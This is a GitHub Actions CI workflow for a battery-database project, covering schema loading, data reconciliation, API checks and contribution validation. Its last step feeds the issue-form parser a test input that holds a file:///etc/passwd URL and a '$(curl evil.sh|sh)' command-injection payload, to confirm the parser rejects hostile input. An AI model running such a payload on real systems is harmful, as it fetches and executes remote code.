name: ci
on: [push, pull_request]

jobs:
  schema:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:16
        env: { POSTGRES_PASSWORD: postgres, POSTGRES_DB: batterydb }
        options: >-
          --health-cmd pg_isready --health-interval 10s
          --health-timeout 5s --health-retries 5
        ports: ['5432:5432']
    env:
      PGHOST: localhost
      PGUSER: postgres
      PGPASSWORD: postgres
    steps:
      - uses: actions/checkout@v4
      - name: One-command setup (what a user actually runs)
        run: ./setup.sh
      - name: Load schema
        run: ./tools/build_db.sh batterydb
      - name: Load seed data
        run: psql -v ON_ERROR_STOP=1 -d batterydb -f seed/001_reference_cells.sql
      - name: Load packs and valuation seed
        run: psql -v ON_ERROR_STOP=1 -d batterydb -f seed/002_packs_and_valuation.sql
      - name: Load accepted contributions into the library
        # The path from an approved battery to a queryable row, exercised on
        # every push. It is the step most likely to rot silently: contrib/ is
        # edited by contributors and bd.* by schema changes, and nothing else
        # here makes the two meet.
        run: |
          pip install psycopg2-binary pyyaml
          python tools/load_contrib.py --dsn "dbname=batterydb host=localhost user=postgres password=postgres"
          psql -v ON_ERROR_STOP=1 -d batterydb -c "
            DO \$\$
            DECLARE n int;
            BEGIN
              SELECT count(*) INTO n FROM bd.observation o
                JOIN bd.provenance p ON p.id = o.provenance_id
               WHERE p.review_note LIKE 'accepted into contrib/%';
              IF n = 0 THEN
                RAISE EXCEPTION 'contrib/ loaded but no observation reached bd.*';
              END IF;
              RAISE NOTICE 'ok: % contributed observation(s) in the library', n;
            END\$\$;"

      - name: Load model parameter sets
        # Published parameter sets (PyBaMM transcriptions of parameterisation
        # papers) land in bd.model_parameterisation against their cell.
        run: python tools/load_models.py --dsn "dbname=batterydb host=localhost user=postgres password=postgres"

      - name: Load patent review corpus into staging
        run: |
          python tools/load_patents.py --dsn "dbname=batterydb host=localhost user=postgres password=postgres"
          psql -v ON_ERROR_STOP=1 -d batterydb -c "
            DO \$\$
            DECLARE source_rows int; publication_candidates int; accepted_rows int;
            BEGIN
              SELECT count(*) INTO source_rows FROM bd_stage.patent_observation;
              SELECT count(*) INTO publication_candidates FROM bd_stage.patent_publication_candidate;
              SELECT count(*) INTO accepted_rows FROM bd.patent_publication;
              IF source_rows <> 1155 OR publication_candidates <> 255 THEN
                RAISE EXCEPTION 'patent staging reconciliation failed: % source / % candidates',
                  source_rows, publication_candidates;
              END IF;
              IF accepted_rows <> 0 THEN
                RAISE EXCEPTION 'unreviewed patent import crossed into accepted tables';
              END IF;
              RAISE NOTICE 'ok: % source rows / % publication candidates staged',
                source_rows, publication_candidates;
            END\$\$;"

      - name: Load the other layers
        # Sites, companies, market series and patents go through their own
        # validator and loader. contrib/ holds none yet; the fictional
        # examples prove the loader in a throwaway copy so the path cannot rot.
        run: |
          python tools/load_layers.py --dsn "dbname=batterydb host=localhost user=postgres password=postgres"
          createdb -T batterydb layerscheck
          python tools/load_layers.py docs/examples --dsn "dbname=layerscheck host=localhost user=postgres password=postgres"
          psql -v ON_ERROR_STOP=1 -d layerscheck -c "
            DO \$\$
            DECLARE sites int; agreements int; fams int; orgs int;
            BEGIN
              SELECT count(*) INTO sites FROM bd.v_site WHERE stage IN ('mining','testing','recycling');
              SELECT count(*) INTO agreements FROM bd.v_supply_agreement WHERE site_uid IS NOT NULL;
              SELECT count(*) INTO fams FROM bd.v_patent_family WHERE review = 'accepted';
              SELECT count(*) INTO orgs FROM bd.organization WHERE uid LIKE 'org/example-lithium%';
              IF sites <> 3 OR agreements <> 1 OR fams <> 1 OR orgs <> 1 THEN
                RAISE EXCEPTION 'layer loader reconciliation failed: % sites / % agreements / % families / % lithium orgs',
                  sites, agreements, fams, orgs;
              END IF;
              RAISE NOTICE 'ok: the example layers load and one company stays one uid';
            END\$\$;"
          dropdb layerscheck

      - name: Run killer queries
        run: psql -v ON_ERROR_STOP=1 -d batterydb -f tests/010_killer_queries.sql
      - name: Run valuation queries
        run: psql -v ON_ERROR_STOP=1 -d batterydb -f tests/020_valuation_queries.sql
      - name: Assert the schema refuses uninterpretable data
        run: |
          # A bare internal resistance with no conditions MUST fail.
          if psql -q -d batterydb -c "
            INSERT INTO bd.observation
              (product_revision_id, quantity_id, value_native, unit_native, provenance_id)
            SELECT pr.id, q.id, 15, 'mohm', pv.id
              FROM bd.product_revision pr, bd.quantity q, bd.provenance pv
             WHERE q.code='internal_resistance_ac' LIMIT 1;" 2>/dev/null
          then
            echo "FAIL: schema accepted a resistance with no method or conditions"
            exit 1
          fi
          echo "ok: uninterpretable data rejected"
      - name: Refresh graph projection and export it
        run: |
          psql -v ON_ERROR_STOP=1 -d batterydb -c "SELECT bd_graph.refresh();"
          python tools/export_graph.py batterydb
          python tools/load_age.py --dsn "dbname=batterydb host=localhost user=postgres password=postgres"
      - name: Export the standards crosswalk
        run: python tools/export_crosswalk.py batterydb
      - name: The API answers for every layer
        # Every registered resource lists, the detail carries its related
        # rows, the query endpoint and the graph endpoint answer, and the
        # OpenAPI document is generated whole.
        run: |
          python api/server.py --port 8089 --dsn "dbname=batterydb host=localhost user=postgres password=postgres" &
          sleep 2
          python - <<'PY'
          import json, urllib.request, urllib.parse, sys
          sys.path.insert(0, "api")
          from resources import RESOURCES
          B = "http://127.0.0.1:8089"
          def get(path):
              with urllib.request.urlopen(B + path) as r:
                  return json.load(r)
          info = get("/v1/info")["data"]
          assert len(info["layers"]) == 11, info["layers"]
          for name, res in RESOURCES.items():
              d = get(f"/v1/{name}?page_limit=1")
              assert "data" in d, (name, d)
          d = get("/v1/cells/" + urllib.parse.quote("cell/lg-energy-solution/inr21700-m50lt", safe=""))
          assert d["data"][0]["relationships"]["observations"]["data"], "cell detail carries observations"
          q = json.dumps({"resource": "companies", "filter": 'stages HAS "cell"', "fields": ["name", "stages"], "page_limit": 3}).encode()
          req = urllib.request.Request(B + "/v1/query", data=q, headers={"Content-Type": "application/json"})
          with urllib.request.urlopen(req) as r:
              assert json.load(r)["meta"]["data_returned"] == 3
          d = get("/v1/graph/reachable?" + urllib.parse.urlencode({"start": "cell/lg-energy-solution/inr21700-m50lt", "depth": 2}))
          assert d["meta"]["data_returned"] > 0, d
          spec = get("/v1/openapi.json")
          assert "/v1/sites/{id}" in spec["paths"] and spec["openapi"] == "3.1.0"
          print(f"ok: {len(RESOURCES)} resources, {len(spec['paths'])} OpenAPI paths")
          PY
          kill %1

  units:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: '3.11' }
      - run: pip install pandas numpy pyyaml jsonschema
      - name: Cycler adapters - sniff, normalise, conventions, RPT segmentation
        run: python tools/cyclers.py selftest
      - name: Filter grammar - parsing, type checking, injection safety
        run: python api/filter_grammar.py
      - name: Python regression tests
        run: python -m unittest discover -s tests -p 'test_*.py'

  contrib:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: '3.11' }
      - run: pip install pyyaml jsonschema
      - name: Validate community contributions
        run: |
          python tools/validate_contrib.py contrib/cells/
          # Sites, companies, market series and patents: their own validator,
          # and the fictional examples that document the formats.
          python tools/validate_layers.py --examples
          # A pending candidate has to clear the contribution schema too, not
          # just the lighter review rules. Approval promotes the file as-is, so
          # anything the schema rejects turns a checked box into a failed run,
          # and the owner finds that out from a red cross instead of from CI.
          python tools/validate_contrib.py review/candidates/
          python tools/validate_review.py
          python tools/check_duplicates.py
          python tools/validate_patents.py
          python tools/check_patent_duplicates.py --fail-on exact
          # Ontology bindings are generated from the published vocabularies;
          # a label edited by hand without a rerun would leave stale IRIs.
          python tools/sync_vocabularies.py check
          # The library as RDF is generated from contrib/ and committed; a
          # stale file would hand a triple store yesterday's data.
          python tools/export_rdf.py --check
          # What every record rests on, and the re-extraction list, kept current.
          python tools/hygiene_report.py --check
          python tools/build_review_batch.py
          python tools/render_review_issues.py
          git diff --exit-code -- review/ || {
            echo "::error::review batch is stale. Run the deterministic builders"
            exit 1
          }
      - name: The page is generated, not maintained
        # web/index.html carries a copy of the contribution data. If the two
        # can drift, a merged submission lands in contrib/ and never appears
        # in the UI -- which makes a working submission flow look broken. This
        # regenerates and fails on any difference, so the copy cannot rot.
        run: |
          python tools/build_web_data.py
          git diff --exit-code -- web/index.html || {
            echo "::error::web/index.html is stale. Run: python tools/build_web_data.py"
            exit 1
          }
      - name: Extraction schema builds from the contribution schema
        # No API key and no network: this checks that the schema the model is
        # forced to fill is still derivable from the schema the validator
        # enforces. If they drift, extraction starts producing files CI then
        # rejects, and the first person to find out is a reviewer.
        run: |
          python - <<'PY'
          import json, sys
          sys.path.insert(0, "tools")
          import jsonschema, extract_datasheet as ed
          reg = json.load(open("json-schema/quantity-registry.json"))
          s = ed.build_schema(reg)
          jsonschema.Draft202012Validator.check_schema(s)
          n = len(s["properties"]["observations"]["items"]["properties"]["quantity"]["enum"])
          assert n == len(reg), f"quantity enum {n} != registry {len(reg)}"
          assert json.dumps(s).count("$ref") == 0, "unresolved $ref in extraction schema"
          print(f"ok: extraction schema offers {n} quantity codes")
          PY
      - name: Issue-form parser handles hostile input
        run: |
          ISSUE_BODY='### Datasheet URL

          file:///etc/passwd

          ### Manufacturer

          $(curl evil.sh|sh)

          ### Model number

          x' python .github/scripts/issue_form.py && {
            echo "FAIL: accepted a file:// datasheet URL"; exit 1; }
          echo "ok: non-http datasheet URL refused"

